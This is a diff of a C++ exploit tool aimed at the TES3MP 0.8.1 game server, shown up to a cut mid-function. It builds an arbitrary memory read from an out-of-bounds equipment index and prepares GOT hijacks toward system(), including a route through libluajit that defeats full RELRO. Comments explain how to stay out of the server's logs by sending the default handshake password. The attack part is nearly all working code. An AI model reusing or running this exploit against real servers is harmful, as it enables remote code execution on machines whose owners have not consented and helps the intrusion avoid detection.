@@ -16,6 +16,7 @@
 // Requires two client connections: A (attacker) and R (a reader in the same cell that receives the
 // relayed packets carrying the leaked bytes). In a real attack these can be two separate hosts.
 #include <cstdio>
+#include <ctime>
 #include <cstdlib>
 #include <cstring>
 #include <cstdint>
@@ -31,15 +32,86 @@
 using namespace RakNet;
 
 // ---- target profile (measured on the distributed 0.8.1 linux build + Ubuntu 24.04 glibc 2.39) ----
+// Everything that is true of a BUILD rather than of a run. Two halves with different origins:
+// the image RVAs come from the target's ELF (public release artifact, or --server-bin), and the
+// layout constants come from its C++ class layout, which no ELF records. tools/gen-profile derives
+// the second half from the headers; --profile loads either half from a file.
 struct Profile {
     uint64_t vtable_rva;   // "vtable for Player + 16", i.e. the value stored at Player+0
     uint64_t strlen_got;   // .got.plt slot for strlen  (the hijack target)
     uint64_t malloc_got;   // .got.plt slot for malloc  (non-IFUNC: safe for deriving the libc base)
-    uint64_t got1_rva;     // .got.plt + 8 == GOT[1] == the loader's link_map head (for remote libc resolution)
     uint64_t malloc_off;   // malloc offset within libc  (only used with --malloc-off/--libc)
     uint64_t system_off;   // system offset within libc  (only used with --system-off/--libc)
+    // --- class layout. Not derivable from the ELF; see tools/gen-profile.cc. ---
+    uint64_t equip_off;      // offsetof(BasePlayer, equipmentItems)
+    uint64_t item_stride;    // sizeof(mwmp::Item)
+    uint64_t item_count_off; // offsetof(Item, count), where the OOB read/write lands
+    uint64_t leak_heap_idx;  // index whose count|charge overlaps chatMessage._M_p
+    uint64_t leak_self_idx;  // index whose count|charge overlaps creatureRefId._M_p (a self-pointer)
+    uint64_t self_ptr_delta; // offsetof(BasePlayer, creatureRefId) + 16 (its SSO buffer)
+    // --- the full-RELRO route. See --via-luajit. ---
+    uint64_t lua_probe_got;  // a JUMP_SLOT in the MAIN binary bound to a libluajit symbol. Reading it
+                             // yields a pointer INTO libluajit, from which its base is masked out the
+                             // same way libc's is. The binary imports 38 of them; any one will do.
+    uint64_t lua_probe_off;  // offset of that same symbol WITHIN libluajit. The loader maps this
+                             // library only page aligned, so the base is derived by subtraction
+                             // rather than by the mask-and-check scan that locates libc.
+    uint64_t anim_group_off; // offsetof(BasePlayer, animation). Animation leads with a 32-byte
+                             // std::string groupname, so this is also &animation.groupname._M_p.
+                             // ID_PLAYER_ANIM_PLAY assigns it and its processor calls no Lua, which
+                             // is what makes it the poisoning vehicle for --via-luajit.
+                             // NOTE: new fields go HERE, at the end. P is positionally initialised,
+                             // so inserting one mid-struct silently reassigns everything after it.
+                             // That is not hypothetical: it cost a run, reading lua_probe_got as
+                             // 0x16a0 and reporting it as a libluajit resolution failure.
+    uint64_t lua_strlen_got; // strlen@got WITHIN libluajit. Writable however the SERVER was built,
+                             // because it belongs to the distro's libluajit-5.1-2 package, which
+                             // ships partial RELRO, and lua_pushstring calls strlen through it.
 };
-static Profile P = { 0x2b5f90, 0x2c31f8, 0x2c3660, 0x2c3008, 0xad750, 0x58750 };
+static Profile P = { 0x2b5f90, 0x2c31f8, 0x2c3660, 0xad750, 0x58750,
+                     0xe00, 80, 32, 25, 28, 0x16f0,
+                     // measured on the 0.8.1 release binary + Ubuntu 24.04 libluajit-5.1-2
+                     0x2c3070,   // lua_tolstring@got, main binary
+                     0x228e0,    // lua_tolstring itself, inside libluajit
+                     0x16a0,     // offsetof(BasePlayer, animation) == &animation.groupname
+                     0x90100 };  // strlen@got inside libluajit
+
+// A profile is `key = value` lines, # comments, blanks ignored. Unknown keys are reported rather
+// than skipped: a typo in a hand-edited profile that silently keeps a baked-in default is the
+// same class of failure as the constants it replaces.
+static bool loadProfile(const char *path)
+{
+    FILE *f = fopen(path, "r");
+    if (!f) { perror(path); return false; }
+    struct { const char *k; uint64_t *v; } tab[] = {
+        {"vtable_rva", &P.vtable_rva}, {"strlen_got", &P.strlen_got}, {"malloc_got", &P.malloc_got},
+        {"anim_group_off", &P.anim_group_off},
+        {"lua_probe_got", &P.lua_probe_got}, {"lua_probe_off", &P.lua_probe_off},
+        {"lua_strlen_got", &P.lua_strlen_got},
+        {"malloc_off", &P.malloc_off}, {"system_off", &P.system_off},
+        {"equip_off", &P.equip_off}, {"item_stride", &P.item_stride},
+        {"item_count_off", &P.item_count_off}, {"leak_heap_idx", &P.leak_heap_idx},
+        {"leak_self_idx", &P.leak_self_idx}, {"self_ptr_delta", &P.self_ptr_delta},
+    };
+    char line[512]; int n = 0; bool ok = true;
+    while (fgets(line, sizeof line, f)) {
+        char *h = strchr(line, '#'); if (h) *h = 0;
+        char *eq = strchr(line, '='); if (!eq) continue;
+        *eq = 0;
+        char key[128] = {0}; if (sscanf(line, " %127s", key) != 1) continue;
+        // Informational keys gen-profile emits that are not addresses.
+        if (!strcmp(key, "name") || !strcmp(key, "token") || !strcmp(key, "scratch_field") ||
+            !strcmp(key, "groom_off") || !strcmp(key, "libc")) continue;
+        bool hit = false;
+        for (auto &t : tab)
+            if (!strcmp(key, t.k)) { *t.v = strtoull(eq + 1, 0, 0); n++; hit = true; break; }
+        if (!hit) { fprintf(stderr, "%s: unknown key '%s'\n", path, key); ok = false; }
+    }
+    fclose(f);
+    if (!ok) { fprintf(stderr, "%s: refusing to run on a profile I do not fully understand.\n", path); return false; }
+    printf("[*] profile %s: %d values loaded\n", path, n);
+    return true;
+}
 
 // Read malloc/system offsets straight out of a copy of the TARGET's libc.so.6. glibc patch builds shift
 // symbol offsets, so the baked-in defaults only match the exact build they were measured on. Minimal ELF64
@@ -82,11 +154,17 @@ static bool readLibcOffsets(const char *path, uint64_t &malloc_off, uint64_t &sy
 }
 
 struct E64Rela { uint64_t r_offset, r_info; int64_t r_addend; };
+struct E64Phdr { uint32_t p_type, p_flags; uint64_t p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_align; };
+struct E64Dyn  { int64_t d_tag; uint64_t d_val; };
 
 // Derive the three server-binary RVAs from the target's own tes3mp-server.x86_64: the strlen and malloc
 // GOT slots from the JUMP_SLOT relocations, and the Player vtable address-point from the (unstripped)
 // symbol table. Nothing is then hardcoded: hand it the two target files and every address is read out.
-static bool readServerBin(const char *path, uint64_t &vt, uint64_t &sgot, uint64_t &mgot)
+// Set by --via-luajit. readServerBin() runs before the globals block further down, so it lives here.
+// It turns the two full-RELRO refusals into notes: that route never writes the executable's GOT.
+static int g_viaLua = 0;
+
+static bool readServerBin(const char *path, uint64_t &vt, uint64_t &sgot, uint64_t &mgot, uint64_t &lgot)
 {
     FILE *f = fopen(path, "rb"); if (!f) { perror(path); return false; }
     fseek(f, 0, SEEK_END); long n = ftell(f); fseek(f, 0, SEEK_SET);
@@ -97,9 +175,112 @@ static bool readServerBin(const char *path, uint64_t &vt, uint64_t &sgot, uint64
     E64Ehdr *eh = (E64Ehdr *)buf.data();
     if (eh->e_shoff == 0 || eh->e_shoff + (uint64_t)eh->e_shnum * sizeof(E64Shdr) > (uint64_t)n) return false;
     E64Shdr *sh = (E64Shdr *)(buf.data() + eh->e_shoff);
-    bool gS = false, gM = false, gV = false;
-    // GOT slots from JUMP_SLOT relocations (R_X86_64_JUMP_SLOT == 7)
-    for (int i = 0; i < eh->e_shnum && !(gS && gM); i++) {
+
+    // ---- structural preconditions, checked FIRST -------------------------------------------
+    // Both are properties of how the target was BUILT, and both make the chain impossible rather
+    // than unreliable, so they are worth a clear refusal here instead of a confusing failure at
+    // step 7. They are also checked before the symbol scan, because "this build can never work"
+    // is more useful than "I could not find a symbol in a build that could never have worked".
+
+    // Full RELRO. TES3MP's CMakeLists sets no hardening flags at all (only -Wall -Wextra -Wundef
+    // -pedantic), so a self-built server inherits whatever its distro's gcc and binutils specs
+    // give it. If GNU_RELRO covers .got.plt the loader maps it read-only before main and step 7
+    // faults. The shipped 0.8.1 release is PARTIAL RELRO: GNU_RELRO ends exactly where .got.plt
+    // begins, which is the only reason this chain exists.
+    if (eh->e_shstrndx < eh->e_shnum && eh->e_phoff &&
+        eh->e_phoff + (uint64_t)eh->e_phnum * sizeof(E64Phdr) <= (uint64_t)n) {
+        // BIND_NOW is the authoritative signal and must be checked FIRST, because a full-RELRO
+        // link often leaves no .got.plt section to test at all: with eager binding there are no
+        // lazy PLT slots, so the linker folds what remains into .got under GNU_RELRO. Measured on
+        // the fuzz pool 2026-08-23: Ubuntu 24.04 with g++ 13 produces GNU_RELRO + BIND_NOW and
+        // ZERO .got.plt sections, so a containment test alone silently passes the exact build
+        // most likely to defeat this chain. Debian 12 with g++ 12 produces partial RELRO and a
+        // writable .got.plt, i.e. a self-built server is immune on one and exposed on the other.
+        for (int i = 0; i < eh->e_shnum; i++) {
+            if (sh[i].sh_type != 6 /*SHT_DYNAMIC*/ || sh[i].sh_entsize == 0) continue;
+            E64Dyn *dy = (E64Dyn *)(buf.data() + sh[i].sh_offset);
+            long dn = sh[i].sh_size / sizeof(E64Dyn);
+            for (long k = 0; k < dn && dy[k].d_tag; k++) {
+                bool now = (dy[k].d_tag == 24)                                  // DT_BIND_NOW
+                        || (dy[k].d_tag == 30       && (dy[k].d_val & 0x8))     // DT_FLAGS   & DF_BIND_NOW
+                        || (dy[k].d_tag == 0x6ffffffb && (dy[k].d_val & 0x1));  // DT_FLAGS_1 & DF_1_NOW
+                if (!now) continue;
+                if (g_viaLua) {
+                    fprintf(stderr, "%s: FULL RELRO (BIND_NOW) -- continuing, because --via-luajit\n"
+                            "    never writes this binary's GOT. It hijacks strlen@got inside the\n"
+                            "    distro's libluajit, whose RELRO this build does not control.\n", path);
+                    break;
+                }
+                fprintf(stderr, "%s: FULL RELRO (BIND_NOW)\n"
+                        "    The loader resolves every PLT slot before main and then maps the GOT read-only,\n"
+                        "    so the step-7 overwrite faults. This chain cannot work against this build.\n"
+                        "    Measured for reference: a plain `g++ -O2` on Ubuntu 24.04 (g++ 13) produces this;\n"
+                        "    the same command on Debian 12 (g++ 12) does not. It is a distro toolchain\n"
+                        "    default, not a choice anyone made.\n", path);
+                return false;
+            }
+        }
+        const char *shstr = buf.data() + sh[eh->e_shstrndx].sh_offset;
+        uint64_t gotplt = 0, gotpltsz = 0;
+        for (int i = 0; i < eh->e_shnum; i++)
+            if (!strcmp(shstr + sh[i].sh_name, ".got.plt")) { gotplt = sh[i].sh_addr; gotpltsz = sh[i].sh_size; }
+        if (gotplt) {
+            E64Phdr *ph = (E64Phdr *)(buf.data() + eh->e_phoff);
+            for (int i = 0; i < eh->e_phnum; i++) {
+                if (ph[i].p_type != 0x6474e552 /*PT_GNU_RELRO*/) continue;
+                if (gotplt >= ph[i].p_vaddr && gotplt < ph[i].p_vaddr + ph[i].p_memsz) {
+                    if (g_viaLua) {
+                        fprintf(stderr, "%s: FULL RELRO (.got.plt inside GNU_RELRO) -- continuing under\n"
+                                "    --via-luajit, which does not write this binary's GOT.\n", path);
+                        break;
+                    }
+                    fprintf(stderr, "%s: FULL RELRO\n"
+                            "    .got.plt [%#llx,%#llx) lies inside GNU_RELRO [%#llx,%#llx), so the loader maps\n"
+                            "    it read-only before main and the step-7 GOT overwrite faults.\n"
+                            "    This chain cannot work against this build. That is a property of the build,\n"
+                            "    not a misconfiguration on your side.\n",
+                            path, (unsigned long long)gotplt, (unsigned long long)(gotplt + gotpltsz),
+                            (unsigned long long)ph[i].p_vaddr,
+                            (unsigned long long)(ph[i].p_vaddr + ph[i].p_memsz));
+                    return false;
+                }
+            }
+        }
+    }
+
+    // std::string ABI. Every fake object the chain plants is the libstdc++ C++11 layout: _M_p at
+    // +0, _M_string_length at +8, capacity/SSO buffer at +16. libc++ lays those out differently,
+    // so the plants would corrupt the wrong fields. CMakeLists:582 adds -stdlib=libc++ whenever
+    // the compiler is Clang, so this is a live case rather than a hypothetical.
+    {
+        bool cxx11 = false, libcpp = false;
+        for (int i = 0; i < eh->e_shnum && !(cxx11 && libcpp); i++) {
+            if (sh[i].sh_type != 2 && sh[i].sh_type != 11) continue;
+            if (sh[i].sh_entsize == 0 || sh[i].sh_link >= eh->e_shnum) continue;
+            E64Sym *sym = (E64Sym *)(buf.data() + sh[i].sh_offset);
+            long cnt = sh[i].sh_size / sizeof(E64Sym);
+            const char *str = buf.data() + sh[sh[i].sh_link].sh_offset;
+            for (long k = 0; k < cnt; k++) {
+                const char *nm = str + sym[k].st_name;
+                if (!cxx11  && strstr(nm, "_ZNSt7__cxx11")) cxx11 = true;
+                if (!libcpp && strstr(nm, "_ZNSt3__1"))     libcpp = true;
+            }
+        }
+        if (libcpp && !cxx11) {
+            fprintf(stderr, "%s: built against libc++ (_ZNSt3__1 mangling), not libstdc++\n"
+                    "    Every plant in this chain assumes the libstdc++ C++11 std::string layout\n"
+                    "    (_M_p +0, length +8, capacity +16). libc++ differs, so the chain would write\n"
+                    "    through the wrong fields. Use a libstdc++ target, or re-derive the layout.\n", path);
+            return false;
+        }
+    }
+
+    bool gS = false, gM = false, gV = false, gL = false;
+    // GOT slots from JUMP_SLOT (7) *or* GLOB_DAT (6) relocations. A `-z now` link is entitled to
+    // emit GLOB_DAT in .rela.dyn where a lazy link emits JUMP_SLOT in .rela.plt, and it does; a
+    // JUMP_SLOT-only scan therefore finds nothing in exactly the full-RELRO build --via-luajit
+    // exists to attack. Both sections are SHT_RELA, so widening the type test is the whole fix.
+    for (int i = 0; i < eh->e_shnum && !(gS && gM && gL); i++) {
         if (sh[i].sh_type != 4 /*SHT_RELA*/ || sh[i].sh_entsize == 0) continue;
         E64Rela *r = (E64Rela *)(buf.data() + sh[i].sh_offset);
         long cnt = sh[i].sh_size / sizeof(E64Rela);
@@ -107,10 +288,12 @@ static bool readServerBin(const char *path, uint64_t &vt, uint64_t &sgot, uint64
         E64Sym *sym = (E64Sym *)(buf.data() + ds.sh_offset);
         const char *str = buf.data() + sh[ds.sh_link].sh_offset;
         for (long k = 0; k < cnt; k++) {
-            if ((r[k].r_info & 0xffffffff) != 7) continue;
+            uint32_t rt = (uint32_t)(r[k].r_info & 0xffffffff);
+            if (rt != 7 /*JUMP_SLOT*/ && rt != 6 /*GLOB_DAT*/) continue;
             const char *nm = str + sym[r[k].r_info >> 32].st_name;
             if (!strcmp(nm, "strlen")) { sgot = r[k].r_offset; gS = true; }
             else if (!strcmp(nm, "malloc")) { mgot = r[k].r_offset; gM = true; }
+            else if (!strcmp(nm, "lua_tolstring")) { lgot = r[k].r_offset; gL = true; }
         }
     }
     // Player vtable address-point (symbol value + 16, past offset-to-top and the typeinfo pointer)
@@ -127,8 +310,15 @@ static bool readServerBin(const char *path, uint64_t &vt, uint64_t &sgot, uint64
             if (!strcmp(nm, "_ZTV6Player") || !strcmp(nm, "_ZTVN4mwmp6PlayerE")) { vt = sym[k].st_value + 16; gV = true; break; }
         }
     }
-    if (!gS || !gM) fprintf(stderr, "%s: missing strlen/malloc JUMP_SLOT relocations\n", path);
-    if (!gV) fprintf(stderr, "%s: no _ZTV6Player vtable symbol (binary stripped? pass the unstripped one)\n", path);
+    if (!gS || !gM) fprintf(stderr, "%s: missing strlen/malloc GOT relocations\n", path);
+    if (!gL) fprintf(stderr, "%s: no lua_tolstring GOT slot%s\n", path,
+                     g_viaLua ? " -- --via-luajit needs one to locate libluajit; supply lua_probe_got in a profile"
+                              : " (only needed for --via-luajit)");
+    if (g_viaLua && !gL) return false;
+    if (!gV) fprintf(stderr, "%s: no _ZTV6Player vtable symbol\n"
+                             "    The binary is stripped. Step 4 turns the leaked Player vptr into an image base by\n"
+                             "    subtracting this RVA, so without it there is nothing to subtract. Pass the\n"
+                             "    unstripped release binary.\n", path);
     return gS && gM && gV;
 }
 
@@ -140,8 +330,20 @@ struct Cli { RakPeerInterface *peer; SystemAddress srv; };
 static const char *g_host = "127.0.0.1";
 static int g_port = 25565;
 static const char *g_token = "0.8.11068954091c54d0596037c4fb54d2812313b7582a1"; // TES3MP_VERSION+PROTO+commitHash
-static const char *g_srvpass = "";   // the actual server password (ID_SYSTEM_HANDSHAKE field 2)
+// TES3MP_DEFAULT_PASSW. Networking.cpp:84 substitutes this when the admin leaves `password`
+// empty, so sending "" against a default server MISMATCHES and logs
+//   "Client at %s tried to join using password, despite the server not being passworded"
+// once per client, twice per run (Networking.cpp:127-129). It is still admitted, because the
+// not-passworded branch falls through to setHandshake(), so the exploit worked while announcing
+// itself in the log every time. Sending the real default matches and is silent.
+static const char *g_srvpass = "blankpassword";  // ID_SYSTEM_HANDSHAKE field 2. NOT a user account.
 static int g_verbose = 0;
+// The relayed packets that carry leaked bytes are OURS. Every equipment relay in the cell used to
+// be accepted, so any other player changing equipment fed their bytes into the leak. Set once from
+// client A after connect; harvest()/harvestFull() drop anything else.
+static RakNetGUID g_srcGuid;
+static bool g_srcKnown = false;
+static unsigned long g_foreign = 0;   // relays dropped as not-ours, reported at the end
 static int g_probe = 0;   // connect both clients, reach POSTLOADED, report, and STOP (touches no memory)
 static std::vector<std::pair<std::string, unsigned>> g_files = {{"Morrowind.esm", 0x7B6AF5B9u}};
 
@@ -298,6 +500,41 @@ static bool readChat(Cli &c, int ms, std::string &out)
 //
 // oneShot != 0 runs a single command and exits, so the deploy tooling can verify itself without
 // driving stdin.
+// --bot: an ordinary client that sits in a cell and generates the traffic a real player would.
+//
+// WHY THIS EXISTS. The single most important fix in the correctness pass is that harvest() and
+// harvestFull() now drop relayed equipment packets that are not ours. Before, ANY player changing
+// equipment in the cell had their inventory parsed as our leaked pointer. That fix could not be
+// tested, because testing it needs a second client producing exactly that traffic, and every other
+// client in this tool is either the attacker or the reader.
+//
+// It sends IN-BOUNDS equipment changes only (index 0..18). This is a load generator, not a second
+// exploit: it must be able to run against a server nobody minds it touching, and it must produce
+// the same relay shape a real player produces or it proves nothing about the filter.
+static int runBot(const char *name, const char *cell, int intervalMs, int equipIdx)
+{
+    Cli B{};
+    if (!connectTo(B, "")) { printf("[bot] could not connect\n"); return 1; }
+    handshake(B, name);
+    if (!stillConnected(B)) { printf("[bot] kicked during handshake (server password?)\n"); return 4; }
+    loadCell(B, cell);
+    printf("[bot] %s in %s, in-bounds equipment index %d every %d ms. ctrl-C to stop.\n",
+           name, cell, equipIdx, intervalMs);
+    for (unsigned long n = 1;; n++) {
+        { BitStream bs; hdr(B, bs, ID_PLAYER_EQUIPMENT);
+          bs.Write(false); uint32_t cnt = 1; bs.Write(cnt);
+          int idx = equipIdx; bs.Write(idx);
+          char rid[64]; snprintf(rid, sizeof rid, "bot_%s_%lu", name, n);
+          RakString r = rstr(rid); RakString::SerializeCompressed(r.C_String(), &bs);
+          int c1 = (int)n, c2 = 0; float ec = 0; bs.Write(c1); bs.Write(c2); bs.Write(ec);
+          snd(B, bs); }
+        for (Packet *p = B.peer->Receive(); p; B.peer->DeallocatePacket(p), p = B.peer->Receive());
+        if (!stillConnected(B)) { printf("[bot] disconnected after %lu sends\n", n); return 1; }
+        if (g_verbose && n % 10 == 0) fprintf(stderr, "[bot] %lu sends\n", n);
+        usleep(intervalMs * 1000);
+    }
+}
+
 static int runShell(const char *name, const char *acctPass, const char *oneShot)
 {
     Cli A{};
@@ -363,7 +600,7 @@ static int runShell(const char *name, const char *acctPass, const char *oneShot)
 static void redirect(Cli &c, uint64_t val)
 {
     BitStream bs; hdr(c, bs, ID_PLAYER_EQUIPMENT);
-    bs.Write(false); uint32_t cnt = 1; bs.Write(cnt); int idx = 25; bs.Write(idx);
+    bs.Write(false); uint32_t cnt = 1; bs.Write(cnt); int idx = (int)P.leak_heap_idx; bs.Write(idx);
     RakString rid(""); RakString::SerializeCompressed(rid.C_String(), &bs);
     int lo = (int)(val & 0xffffffff), hi = (int)(val >> 32), e = 0;
     bs.Write(lo); bs.Write(hi); bs.Write(e); snd(c, bs); usleep(120000);
@@ -386,6 +623,9 @@ static uint64_t harvest(Cli &R, int &oi)
             if (p->data[0] != ID_PLAYER_EQUIPMENT) continue;
             BitStream rd(p->data, p->length, false);
             unsigned char id; rd.Read(id); RakNetGUID g; rd.Read(g);
+            // The relay carries the GUID of the player whose equipment changed. Only ours can be
+            // a leak; anyone else's is another player's real inventory landing in our result.
+            if (g_srcKnown && g != g_srcGuid) { g_foreign++; continue; }
             bool full = false; rd.Read(full); if (full) continue;
             uint32_t cn = 0; rd.Read(cn); if (cn != 1) continue;
             int wi = 0; rd.Read(wi); RakString rs; rs.DeserializeCompressed(&rd);
@@ -418,78 +658,175 @@ static void cellChange(Cli &c, const char *cn)
     snd(c, bs); usleep(200000);
 }
 
-static uint64_t harvestFull(Cli &R, int k)
+// One 8-byte read. `ok` separates "the relay arrived and the string was empty" from "no relay
+// arrived": both used to return 0, so a legitimately-zero read polled for ten seconds and then
+// reported an indistinguishable failure. Keeping the observed length is what lets a caller treat
+// a zero-length answer as "this byte is 0x00" rather than as an error, which is the whole basis
+// of the NUL-transparent shifted read.
+struct ReadResult { bool ok; size_t len; uint64_t val; };
+
+static ReadResult harvestFull(Cli &R, int k)
 {
-    uint64_t w = 0;
-    for (int i = 0; i < 250 && !w; i++) {
+    for (int i = 0; i < 250; i++) {
         for (Packet *p = R.peer->Receive(); p; R.peer->DeallocatePacket(p), p = R.peer->Receive()) {
             if (p->data[0] != ID_PLAYER_EQUIPMENT) continue;
             BitStream rd(p->data, p->length, false);
             unsigned char id; rd.Read(id); RakNetGUID g; rd.Read(g);
+            if (g_srcKnown && g != g_srcGuid) { g_foreign++; continue; }
             bool full = false; rd.Read(full); if (!full) continue;
+            // Latch on the FIRST full relay of ours after the trigger, whatever it says. The old
+            // code latched on a non-zero value, which silently turned an empty read into a timeout.
+            ReadResult r{true, 0, 0};
             for (int it = 0; it < 19; it++) {
                 RakString rs; rs.DeserializeCompressed(&rd);
                 int cnt = 0, chg = 0; float ench = 0; rd.Read(cnt); rd.Read(chg); rd.Read(ench);
                 const char *s = rs.C_String(); size_t n = rs.GetLength();
                 uint64_t v = 0; for (size_t b = 0; b < n && b < 8; b++) v |= ((uint64_t)(unsigned char)s[b]) << (8 * b);
-                if (it == k) vlog("[item %d len=%zu value=%#llx]\n", it, n, (unsigned long long)v);
-                if (it == k && v) w = v;
+                if (it == k) { vlog("[item %d len=%zu value=%#llx]\n", it, n, (unsigned long long)v); r.len = n; r.val = v; }
             }
+            for (Packet *q = R.peer->Receive(); q; R.peer->DeallocatePacket(q), q = R.peer->Receive());
+            return r;
         }
         usleep(40000);
     }
-    return w;
+    return ReadResult{false, 0, 0};
 }
 
 // ARBITRARY READ. Plant a fake std::string {_M_p = target, _M_len = 8} in eq[k].refId, trigger the
 // full-info relay, and the server serializes 8 bytes read from `target` straight to the reader.
 // Written byte-wise: the chat write is strlen-truncated, so a target containing an internal NUL
 // would silently truncate a single 6-byte write.
-static uint64_t aread(Cli &A, Cli &R, uint64_t eq, int k, uint64_t tgt, const char *cell)
+// Shadow of every fake std::string this run has planted, so a read only has to write the bytes
+// that actually CHANGED.
+//
+// The old aread re-wrote the whole 16-byte object every time: six bytes of _M_p, the high-byte
+// terminator, the length, and six capacity bytes, then undid all of it afterwards. Twenty-two
+// byte-writes at 240 ms each, around 5.3 s of the roughly 7 s a single read cost, to re-state
+// values that were already correct. Consecutive reads differ only in the low byte or two of _M_p:
+// walking a program header table steps 56 bytes at a time, and a hash chain steps 4. So keep what
+// was planted and write the delta.
+//
+// The restore also moves out of the read and into teardown. It exists so a Player destructor never
+// frees a wild pointer at disconnect, which is a per-RUN obligation, not a per-read one.
+struct Plant { bool live = false, hdr = false; uint64_t ptr = 0; };
+static Plant g_plant[19];
+
+// Restore every planted slot to its own SSO buffer. Called on the failure paths, where the process
+// is expected to keep running: main() used to return 3 from several points AFTER aiming a string at
+// an arbitrary address, leaving a Player whose destructor frees a wild pointer at disconnect.
+static void restorePlants(Cli &A, uint64_t eq)
 {
-    uint64_t eqk = eq + 80 * k;
-    for (int i = 0; i < 6; i++) {
-        unsigned char b = (unsigned char)((tgt >> (8 * i)) & 0xff);
-        redirect(A, eqk + i);
-        if (b) sendChatBytes(A, &b, 1); else sendChatBytes(A, (const void *)"", 0);
+    for (int k = 0; k < 19; k++) {
+        if (!g_plant[k].live) continue;
+        uint64_t eqk = eq + P.item_stride * k, sso = eqk + 16;
+        for (int i = 0; i < 6; i++) {
+            unsigned char b = (unsigned char)((sso >> (8 * i)) & 0xff);
+            redirect(A, eqk + i);
+            if (b) sendChatBytes(A, &b, 1); else sendChatBytes(A, (const void *)"", 0);
+        }
+        redirect(A, eqk + 6); sendChatBytes(A, (const void *)"", 0);
+        { unsigned char z = 0; redirect(A, eqk + 8); sendChatBytes(A, &z, 1); }
+        g_plant[k] = Plant{};
+        vlog("[restored slot %d]\n", k);
     }
-    redirect(A, eqk + 6); sendChatBytes(A, (const void *)"", 0);
-    { unsigned char e = 8; redirect(A, eqk + 8); sendChatBytes(A, &e, 1); }
-    for (int z = 10; z < 16; z++) { redirect(A, eqk + z); sendChatBytes(A, (const void *)"", 0); }
+}
+
+static ReadResult aread(Cli &A, Cli &R, uint64_t eq, int k, uint64_t tgt, const char *cell)
+{
+    uint64_t eqk = eq + P.item_stride * k;
+    Plant &pl = g_plant[k];
+    int pkts = 0;
+
+    // Length and capacity are identical on every read through this slot, so write them once.
+    if (!pl.hdr) {
+        { unsigned char e = 8; redirect(A, eqk + 8); sendChatBytes(A, &e, 1); }  // _M_string_length = 8
+        for (int z = 10; z < 16; z++) { redirect(A, eqk + z); sendChatBytes(A, (const void *)"", 0); }
+        pl.hdr = true; pkts += 7;
+    }
+
+    // Plant _M_p as maximal NUL-free RUNS, one packet each, instead of one packet per byte.
+    //
+    // Byte-at-a-time was not paranoia: the write is `chatMessage = rstr.C_String()`, which is
+    // strlen-bounded, so a single six-byte write of a pointer containing an internal zero would be
+    // silently truncated. But that only forces a split AT the zero bytes, not everywhere. A typical
+    // heap or image pointer here is six non-zero bytes, so it goes in ONE packet rather than six.
+    //
+    // The subtlety that makes a naive "only write what changed" optimisation WRONG, and which cost
+    // a debugging cycle to find: operator=(const char*) writes strlen(s) bytes AND a terminating
+    // NUL, so writing byte i also zeroes byte i+1. Skipping an unchanged byte i+1 after writing
+    // byte i therefore corrupts the pointer. Writing whole runs is both faster and immune to that,
+    // because each run rewrites everything after the previous run's terminator.
+    {
+        unsigned char pb[6];
+        for (int i = 0; i < 6; i++) pb[i] = (unsigned char)((tgt >> (8 * i)) & 0xff);
+        int i = 0;
+        while (i < 6) {
+            if (!pb[i]) {                       // a zero byte: an empty write leaves just the NUL
+                redirect(A, eqk + i); sendChatBytes(A, (const void *)"", 0); pkts++;
+                i++; continue;
+            }
+            int j = i; while (j < 6 && pb[j]) j++;   // maximal non-zero run [i, j)
+            redirect(A, eqk + i); sendChatBytes(A, pb + i, (size_t)(j - i)); pkts++;
+            i = j;                              // byte j was zeroed by that write's terminator
+        }
+        // Byte 6 must be 0. The last run's terminator already did it when the run reached byte 5.
+        if (pb[5] == 0) { redirect(A, eqk + 6); sendChatBytes(A, (const void *)"", 0); pkts++; }
+    }
+    pl.ptr = tgt; pl.live = true;
+    vlog("[read %#llx via slot %d: %d packets]\n", (unsigned long long)tgt, k, pkts);
+
     for (Packet *p = R.peer->Receive(); p; R.peer->DeallocatePacket(p), p = R.peer->Receive());
     drainboth(A, R, 1200);          // RELIABLE_ORDERED only orders within one channel; let the plant land first
     cellChange(A, cell);
-    uint64_t r = harvestFull(R, k);
-    // restore _M_p to the string's own SSO buffer so no destructor frees a wild pointer
-    { uint64_t sso = eqk + 16;
-      for (int i = 0; i < 6; i++) {
-          unsigned char b = (unsigned char)((sso >> (8 * i)) & 0xff);
-          redirect(A, eqk + i);
-          if (b) sendChatBytes(A, &b, 1); else sendChatBytes(A, (const void *)"", 0);
-      } }
-    redirect(A, eqk + 6); sendChatBytes(A, (const void *)"", 0);
-    { unsigned char z = 0; redirect(A, eqk + 8); sendChatBytes(A, &z, 1); }
-    return r;
+    return harvestFull(R, k);
 }
 
-static uint64_t RD(Cli &A, Cli &R, uint64_t eq, uint64_t addr, const char *cell) { return aread(A, R, eq, 7, addr, cell); }
-
-// Remote libc base, no files. The read is strlen-truncated so it cannot read a page-aligned VALUE (low byte
-// 0x00) -- which rules out walking the loader's link_map (l_addr is a load base). But &malloc IS readable
-// (libc+0xad..., non-zero low byte), and the libc base carries the ELF magic \x7fELF, whose first byte 0x7f
-// is also readable. So mask &malloc down to a load alignment and confirm the magic; fall back to a bounded
-// page scan. Modern glibc is 2 MiB-aligned, so this is typically two reads.
-static uint64_t remoteLibcBase(Cli &A, Cli &R, uint64_t eq, const char *cell, uint64_t image, uint64_t &mallocPtrOut)
+// NUL-TRANSPARENT 8-BYTE READ.
+//
+// The relay serialises refId with EncodeString, which is strlen-bounded, so a single read returns
+// only the bytes up to the first zero. A page-aligned value has a zero LOW byte and comes back as
+// an empty string, indistinguishable from a failed read. That is why the libc base has to be found
+// by masking a non-zero pointer and confirming ELF magic, and why walking the loader's link_map was
+// abandoned: l_addr IS a load base, so it always reads as empty.
+//
+// The wall is softer than it looks. Read at tgt+k instead, and a zero-length answer at offset k is
+// not a failure, it is the VALUE of byte k. The observed length tells you where the next NUL is, so
+// each read either delivers a run or identifies one zero byte, and the whole eight bytes come back
+// in at most eight reads, typically one or two. This is what harvestFull's ok/len fields exist for:
+// with the old "non-zero value or timeout" return, none of this is expressible.
+static ReadResult aread8(Cli &A, Cli &R, uint64_t eq, int k, uint64_t tgt, const char *cell)
 {
-    uint64_t mp = RD(A, R, eq, image + P.malloc_got, cell);      // &malloc (readable)
-    mallocPtrOut = mp;
-    if (mp < 0x10000) return 0;
-    for (uint64_t a = 0x200000; a >= 0x1000; a >>= 1) {          // 2 MiB, 1 MiB, ... 4 KiB
-        uint64_t c = mp & ~(a - 1);
-        if ((uint32_t)RD(A, R, eq, c, cell) == 0x464c457fU) return c;
+    unsigned char b[8] = {0};
+    int pos = 0, reads = 0;
+    while (pos < 8) {
